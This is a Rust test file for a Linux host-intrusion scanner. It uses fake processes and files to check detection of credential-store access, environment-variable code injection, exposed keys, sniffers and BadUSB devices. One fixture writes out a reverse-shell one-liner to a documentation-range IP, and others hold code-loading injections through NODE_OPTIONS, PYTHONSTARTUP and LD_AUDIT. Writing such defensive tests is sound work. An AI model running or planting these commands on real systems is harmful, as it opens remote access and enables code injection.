//! Browser helpers and password stores, keys and environment variables, io_uring, isolated
//! namespaces, suspicious hardware and packet sniffers. Made-up files in a temporary directory;
//! nothing on the real system is read or changed.

use scanner::baseline::{self, newly_tracked, Baseline};
use scanner::config::Config;
use scanner::modules::hardware::log_keyboard_drives;
use scanner::modules::netwatch::packet_sockets;
use scanner::modules::persistence::hooks::assignment;
use scanner::modules::sandboxes::managed_cgroup;
use scanner::modules::wallet::{asks_for_secrets, judge_caller, parse_call};
use scanner::modules::secrets::{hide_secrets, judge_reader, judge_variable, names_a_secret, secret_store, usual_agent_socket};
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn mode(root: &Path, abs: &str, bits: u32) {
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(bits)).expect("chmod");
}

fn link(root: &Path, abs: &str, target: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    symlink(target, p).expect("link");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<&'a scanner::finding::Finding> {
    report.findings.iter().filter(|f| f.rule == rule).collect()
}

fn levels(report: &Report, rule: &str) -> Vec<Severity> {
    let mut v: Vec<Severity> = of(report, rule).iter().map(|f| f.severity).collect();
    v.sort();
    v
}

fn fake_process(root: &Path, pid: u32, ppid: u32, exe: &str, cmdline: &str) {
    let name = exe.rsplit('/').next().unwrap_or("p");
    write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({name}) S {ppid} 1 1 0 -1 4194560 0 0\n"));
    write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{name}\nPPid:\t{ppid}\nUid:\t1000 1000 1000 1000\n"));
    write(root, &format!("/proc/{pid}/cmdline"), cmdline);
    link(root, &format!("/proc/{pid}/exe"), exe);
}

#[test]
fn only_the_browser_should_open_its_saved_passwords() {
    let logins = "/home/anna/.mozilla/firefox/x.default/logins.json";
    assert!(secret_store(logins).is_some());
    assert!(secret_store("/home/anna/.config/chromium/Default/Cookies-journal").is_some());
    assert_eq!(secret_store("/home/anna/.local/share/keyrings/login.keyring"), Some("password wallet"));
    assert_eq!(secret_store("/home/anna/project/Cookies"), None);
    let cfg = Config::default();
    let names = |n: &str| vec![n.to_string()];
    assert_eq!(judge_reader(&cfg, "browser passwords or cookies", &names("firefox-esr"), "/usr/lib/firefox-esr/firefox-esr"), None);
    assert_eq!(judge_reader(&cfg, "browser passwords or cookies", &names("firefox"), "/tmp/firefox"), Some(Severity::Critical));
    assert_eq!(judge_reader(&cfg, "browser passwords or cookies", &names("rsync"), "/usr/bin/rsync"), Some(Severity::Low));
    assert_eq!(judge_reader(&cfg, "password wallet", &names("python3"), "/usr/bin/python3"), Some(Severity::High));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    fake_process(root, 50, 1, "/usr/lib/firefox-esr/firefox-esr", "firefox-esr");
    link(root, "/proc/50/fd/7", logins);
    fake_process(root, 51, 1, "/home/anna/.cache/upd", "upd");
    link(root, "/proc/51/fd/3", logins);
    let report = scan(root, &[ModuleId::ProcAudit]);
    let found = of(&report, "PROC-SECRET-ACCESS");
    assert_eq!(found.len(), 1);
    assert_eq!(found[0].severity, Severity::Critical);
    assert!(found[0].evidence.contains("logins.json"));
}

#[test]
fn variables_that_load_code_and_secrets_are_never_printed() {
    let cfg = Config::default();
    let level = |n: &str, v: &str| judge_variable(&cfg, n, v).map(|r| r.0);
    assert_eq!(level("NODE_OPTIONS", "--max-old-space-size=4096"), None);
    assert_eq!(level("NODE_OPTIONS", "--require /tmp/x.js"), Some(Severity::High));
    assert_eq!(level("NODE_OPTIONS", "--require=/usr/share/tool/hook.js"), Some(Severity::Low));
    assert_eq!(level("PYTHONSTARTUP", "/home/anna/.cache/s.py"), Some(Severity::High));
    assert_eq!(level("BASH_ENV", "/etc/bash_env"), Some(Severity::Medium));
    assert_eq!(level("LD_AUDIT", "/usr/local/lib/a.so"), Some(Severity::High));
    assert_eq!(level("PYTHONPATH", "/home/anna/lib"), None);
    assert_eq!(level("EDITOR", "vim"), None);

    assert!(usual_agent_socket("/run/user/1000/keyring/ssh"));
    assert!(usual_agent_socket("/tmp/ssh-AbC/agent.99"));
    assert!(!usual_agent_socket("/tmp/.x/agent.sock"));
    assert!(names_a_secret("OPENAI_API_KEY") && names_a_secret("GITHUB_TOKEN"));
    assert!(!names_a_secret("XDG_ACTIVATION_TOKEN") && !names_a_secret("PATH"));
    let shown = hide_secrets("-javaagent:/tmp/a.jar -Dhttp.proxyPassword=hunter2 https://anna:hunter3@example.org/x");
    assert!(shown.contains("/tmp/a.jar") && !shown.contains("hunter2") && !shown.contains("hunter3"), "{shown}");
    assert_eq!(assignment("export NODE_OPTIONS=\"--require /tmp/a.js\""), Some(("NODE_OPTIONS", "--require /tmp/a.js")));
    assert_eq!(assignment("if [ x = y ]; then"), None);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    fake_process(root, 60, 1, "/usr/bin/node", "node");
    write(root, "/proc/60/environ", "NODE_OPTIONS=--require /tmp/x.js\0SSH_AUTH_SOCK=/tmp/.x/agent.sock\0OPENAI_API_KEY=sk-very-secret-value\0");
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.config/environment.d/x.conf", "PYTHONSTARTUP=/dev/shm/s.py\n");
    let report = scan(root, &[ModuleId::ProcAudit, ModuleId::Persistence]);
    assert_eq!(levels(&report, "PROC-ENV-INJECT"), vec![Severity::High]);
    assert_eq!(levels(&report, "PROC-SSH-SOCKET"), vec![Severity::Medium]);
    assert_eq!(levels(&report, "PROC-ENV-SECRETS"), vec![Severity::Low]);
    assert_eq!(levels(&report, "PERS-ENV-INJECT"), vec![Severity::High]);
    assert!(of(&report, "PROC-ENV-SECRETS")[0].evidence.contains("OPENAI_API_KEY"));
    let everything = serde_json::to_string(&report).expect("json");
    assert!(!everything.contains("sk-very-secret-value"));
    assert!(report.inventory.persistence_files.contains_key("/home/anna/.config/environment.d/x.conf"));
    assert!(newly_tracked("/home/anna/.config/environment.d/x.conf"));
}

#[test]
fn keys_and_logins_that_others_can_read() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\nbo:x:1001:1001::/home/bo:/bin/bash\n");
    for file in ["/home/anna/.ssh/id_ed25519", "/home/anna/.ssh/id_ed25519.pub", "/home/anna/.aws/credentials", "/home/anna/code/site/.env", "/home/anna/.netrc", "/home/anna/.npmrc"] {
        write(root, file, "TOP-SECRET-CONTENT\n");
        mode(root, file, 0o644);
    }
    mode(root, "/home/anna/.netrc", 0o600);
    for folder in ["/home/anna", "/home/anna/.ssh", "/home/anna/.aws", "/home/anna/code", "/home/anna/code/site"] {
        mode(root, folder, 0o755);
    }
    // bo's home is closed, so the open key inside it cannot be reached
    write(root, "/home/bo/.ssh/id_rsa", "TOP-SECRET-CONTENT\n");
    mode(root, "/home/bo/.ssh/id_rsa", 0o644);
    mode(root, "/home/bo", 0o700);
    let report = scan(root, &[ModuleId::FsPerms]);
    assert_eq!(levels(&report, "FS-SECRET-PERMS"), vec![Severity::Low, Severity::Medium, Severity::High]);
    let text = |s: Severity| of(&report, "FS-SECRET-PERMS").into_iter().find(|f| f.severity == s).map(|f| f.evidence.clone()).unwrap_or_default();
    assert!(text(Severity::High).contains("id_ed25519") && !text(Severity::High).contains(".pub"));
    assert!(text(Severity::Medium).contains(".aws/credentials") && text(Severity::Medium).contains(".env"));
    assert!(!text(Severity::Medium).contains(".netrc") && !text(Severity::Medium).contains(".npmrc"));
    assert!(text(Severity::Low).contains("/home/bo/.ssh/id_rsa"));
    assert!(!serde_json::to_string(&report).expect("json").contains("TOP-SECRET-CONTENT"));
}

#[test]
fn a_browser_helper_script_that_opens_a_back_door_is_critical() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.mozilla/native-messaging-hosts/h.json", "{\"path\": \"/home/anna/bin/host\"}");
    write(root, "/home/anna/bin/host", "#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n");
    mode(root, "/home/anna/bin/host", 0o755);
    let report = scan(root, &[ModuleId::FsPerms, ModuleId::Persistence]);
    assert_eq!(levels(&report, "FS-BROWSER-NATIVE"), vec![Severity::Critical]);
    assert!(report.inventory.persistence_files.contains_key("/home/anna/.mozilla/native-messaging-hosts/h.json"));
}

#[test]
fn io_uring_and_unexplained_namespaces() {
    assert!(managed_cgroup("0::/system.slice/x.service"));
    assert!(!managed_cgroup("0::/user.slice/user-1000.slice/session-2.scope"));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let spaces = |pid: u32, user: u32, net: u32, mnt: u32| {
        for (kind, id) in [("user", user), ("net", net), ("mnt", mnt)] {
            link(root, &format!("/proc/{pid}/ns/{kind}"), &format!("{kind}:[{id}]"));
        }
    };
    fake_process(root, 1, 0, "/usr/lib/systemd/systemd", "init");
    spaces(1, 1, 2, 3);
    fake_process(root, 70, 1, "/tmp/miner", "miner");
    link(root, "/proc/70/fd/4", "anon_inode:[io_uring]");
    spaces(70, 100, 101, 3);
    fake_process(root, 71, 1, "/usr/bin/postgres", "postgres");
    link(root, "/proc/71/fd/4", "anon_inode:[io_uring]");
    spaces(71, 1, 2, 3);
    // a browser sandbox and its child, and a container
    fake_process(root, 80, 1, "/usr/bin/bwrap", "bwrap");
    spaces(80, 200, 2, 201);
    fake_process(root, 81, 80, "/app/bin/thing", "thing");
    spaces(81, 200, 2, 201);
    fake_process(root, 90, 1, "/usr/sbin/nginx", "nginx");
    write(root, "/proc/90/cgroup", "0::/system.slice/docker-abc.scope\n");
    spaces(90, 1, 300, 301);
    // a private mount namespace alone is normal for an installed program
    fake_process(root, 91, 1, "/usr/libexec/thingd", "thingd");
    spaces(91, 1, 2, 400);
    // a packaged user service with isolation settings
    fake_process(root, 20, 1, "/usr/lib/systemd/systemd", "systemd\0--user");
    fake_process(root, 21, 20, "/usr/libexec/quietd", "quietd");
    write(root, "/proc/21/cgroup", "0::/user.slice/user-1000.slice/user@1000.service/app.slice/quietd.service\n");
    spaces(21, 500, 2, 501);
    // the sandbox of an installed Electron app
    fake_process(root, 24, 20, "/usr/lib/some-app/some-app", "/usr/lib/some-app/some-app --type=zygote");
    spaces(24, 550, 551, 3);
    let report = scan(root, &[ModuleId::ProcAudit]);
    assert_eq!(levels(&report, "PROC-IO-URING"), vec![Severity::High]);
    let odd = of(&report, "PROC-NAMESPACE");
    assert_eq!(odd.len(), 1, "{:?}", odd.iter().map(|f| &f.evidence).collect::<Vec<_>>());
    assert_eq!(odd[0].severity, Severity::High);
    assert!(odd[0].evidence.contains("/tmp/miner"));

    // typed in a terminal: that every program descends from the user's systemd explains nothing
    fake_process(root, 22, 20, "/usr/bin/konsole", "konsole");
    fake_process(root, 23, 22, "/usr/bin/unshare", "unshare\0-Urn");
    spaces(23, 600, 601, 3);
    let report = scan(root, &[ModuleId::ProcAudit]);
    let manual = of(&report, "PROC-NAMESPACE").into_iter().find(|f| f.evidence.contains("unshare")).expect("unshare is reported");
    assert_eq!(manual.severity, Severity::Medium);
}

#[test]
fn bad_usb_thunderbolt_and_new_devices() {
    let lines = [
        "kernel: usb-storage 1-2:1.1: USB Mass Storage device detected",
        "kernel: input: Duck Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-2/1-2:1.0/0003:1234:0001.0001/input/input9",
        "kernel: input: Honest Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4:1.0/0003:046D:0001.0002/input/input10",
    ];
    let seen = log_keyboard_drives(&lines);
    assert_eq!(seen.len(), 1, "{seen:?}");
    assert!(seen[0].starts_with("port 1-2:"));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let usb = "/sys/bus/usb/devices";
    let interface = |name: &str, class: &str, protocol: &str| {
        write(root, &format!("{usb}/{name}/bInterfaceClass"), class);
        write(root, &format!("{usb}/{name}/bInterfaceProtocol"), protocol);
    };
    interface("1-4:1.0", "03\n", "01\n");
    write(root, &format!("{usb}/1-4/product"), "Honest Keyboard\n");
    let before = scan(root, &[ModuleId::Kernel]);
    assert!(of(&before, "KERN-USB-BADUSB").is_empty());

    interface("1-2:1.0", "03\n", "01\n");
    interface("1-2:1.1", "08\n", "50\n");
    write(root, &format!("{usb}/1-2/product"), "Duck\n");
    write(root, "/sys/bus/thunderbolt/devices/domain0/security", "none\n");
    write(root, "/sys/bus/thunderbolt/devices/0-1/device_name", "Dock\n");
    write(root, "/sys/bus/thunderbolt/devices/0-1/authorized", "1\n");
    let after = scan(root, &[ModuleId::Kernel]);
    assert_eq!(levels(&after, "KERN-USB-BADUSB"), vec![Severity::High]);
    assert_eq!(levels(&after, "KERN-THUNDERBOLT-OPEN"), vec![Severity::Medium]);
    assert_eq!(levels(&after, "KERN-THUNDERBOLT"), vec![Severity::Low]);
    let (changes, _) = baseline::compare(&Baseline::from_report(&before), &after.inventory, &after.modules);
    assert_eq!(changes.iter().filter(|f| f.rule == "BASE-DEVICE-NEW").count(), 2);
}

#[test]
fn raw_packet_sockets_show_sniffers() {
    let table = "sk       RefCnt Type Proto  Iface R Rmem   User   Inode\n\
                 0000 3      3    0003   2     1 0      0      5001\n\
                 0000 3      3    888e   3     1 0      0      5002\n\
                 0000 3      3    0003   2     1 0      0      5003\n";
    assert_eq!(packet_sockets(table), vec![(3, 5001), (0x888e, 5002), (3, 5003)]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/net/packet", table);
    fake_process(root, 95, 1, "/dev/shm/s", "s");
    link(root, "/proc/95/fd/3", "socket:[5001]");
    fake_process(root, 96, 1, "/usr/bin/tcpdump", "tcpdump");
    link(root, "/proc/96/fd/3", "socket:[5003]");
    let report = scan(root, &[ModuleId::NetProc]);
    assert_eq!(levels(&report, "NET-SNIFFER"), vec![Severity::Medium, Severity::High]);
}

#[test]
fn programs_that_ask_the_password_wallet() {
    let line = "mc\t1795735556.186201\t2\t:1.203\torg.freedesktop.secrets\t/org/freedesktop/secrets\torg.freedesktop.Secret.Service\tSearchItems";
    assert_eq!(parse_call(line), Some((":1.203", "org.freedesktop.Secret.Service", "SearchItems")));
    assert_eq!(parse_call("sig\t1\t2\torg.freedesktop.DBus\t:1.2\t/x\torg.freedesktop.DBus\tNameAcquired"), None);
    assert!(asks_for_secrets("GetSecrets") && asks_for_secrets("readPassword") && asks_for_secrets("passwordList"));
    assert!(!asks_for_secrets("isEnabled") && !asks_for_secrets("networkWallet") && !asks_for_secrets("close"));

    let cfg = Config::default();
    let level = |name: &str, exe: &str| judge_caller(&cfg, &[name.to_string()], exe).0;
    assert_eq!(level("firefox-esr", "/usr/lib/firefox-esr/firefox-esr"), Severity::Low);
    assert_eq!(level("secret-tool", "/usr/bin/secret-tool"), Severity::Medium);
    assert_eq!(level("python3.13", "/usr/bin/python3.13"), Severity::Medium);
    assert_eq!(level("tool", "/usr/local/bin/tool"), Severity::Medium);
    assert_eq!(level("x", "/home/anna/Downloads/x"), Severity::High);
    assert_eq!(level("x", "/tmp/x"), Severity::Critical);
}
